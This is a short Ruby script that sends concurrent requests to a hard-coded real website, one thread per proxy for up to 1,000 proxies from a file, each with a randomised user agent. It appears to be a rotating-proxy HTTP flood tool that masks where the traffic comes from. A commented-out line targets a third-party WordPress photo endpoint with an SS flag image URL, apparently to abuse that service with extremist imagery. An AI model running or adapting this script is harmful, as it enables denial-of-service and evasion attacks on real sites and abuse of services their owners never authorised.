require 'open-uri'
require 'useragents'
require 'async'
require 'eventmachine'
require 'em-http'
require 'pp'

count = 0

#url = 'http://coxel.ws.pho.to/wp-admin/admin-ajax.php?action=send_photo&image_url=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fcommons%2Fthumb%2Fc%2Fc2%2FFlag_of_the_Schutzstaffel.svg%2F1200px-Flag_of_the_Schutzstaffel.svg.png'
url = 'http://stalnoy.org'
proxy = []

File.readlines('./http_proxy.txt').each_with_index do |line, index|
break if index == 1000
proxy.append(line.strip)
end

#threads = []
start = Time.now
t_index = 0

@threads = Array.new(proxy.count) do |i|
  Thread.new(i) do
		Thread.current.report_on_exception = false
		puts "Request #{i} "
		count += 1
		t_index += 1
		open(url, 'User-Agent' => UserAgents.rand(), proxy: URI.parse("http://#{proxy[i-1]}")) do |f|  
		print "Request #{i} " + proxy[i-1] + " " + f.status.to_s + "\n"
		# @threads.delete(Thread.current)
		end

		#Thread.current.exit
		#if t_index == 10 
			#@threads.each do |t|
			#	if t.status == false
			#	puts t  
			#	@threads.delete(t)
			#	puts 'deleted'
			#	end  
				
			#end
		
		#end
	end

	
end
  
begin
@threads.each{|t| t.start }
rescue NoMethodError
rescue Exception => e
  puts e
end
finish = Time.now

diff = finish - start

puts "count=#{count}"
puts "Time spent: #{diff}"
puts @threads.count
